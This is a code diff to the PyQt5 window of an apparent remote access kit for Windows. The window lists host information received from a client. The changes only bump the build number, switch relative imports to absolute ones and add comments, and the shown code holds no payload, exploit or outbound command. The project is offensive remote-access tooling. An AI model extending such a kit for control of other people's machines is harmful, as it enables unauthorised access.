@@ -10,23 +10,33 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
 from PyQt5 import QtCore, QtWidgets, Qt
-from ..Qt5.icons import IconObj
-from..utils.file_paths import DSFilePath
-from ..logging.logging import LoggingUtilitys
+from core.Qt5.icons import IconObj
+from core.utils.file_paths import DSFilePath
+from core.logging.logging import LoggingUtilitys
 from os import remove
 
 class Ui_host_info_window(object):
     def setupUi(self, host_information_window):
+        """
+        Initialize our UI parameters
+        """
         host_information_window.setObjectName("host_information_window")
         host_information_window.resize(916, 712)
         host_information_window.setStyleSheet(f"background-color:blue;")
         host_information_window.setWindowIcon(IconObj().system_icon)
+        """
+        Create list object, set geometry and object name
+        """
         self.host_info_list = QtWidgets.QListWidget(host_information_window)
         self.host_info_list.setGeometry(QtCore.QRect(0, 0, 921, 711))
         self.host_info_list.setObjectName("host_info_list")
+        """
+        Populate our window with the information from the client
+        and complete the UI setup
+        """
         self.display_system_info()
         self.retranslateUi(host_information_window)
         QtCore.QMetaObject.connectSlotsByName(host_information_window)
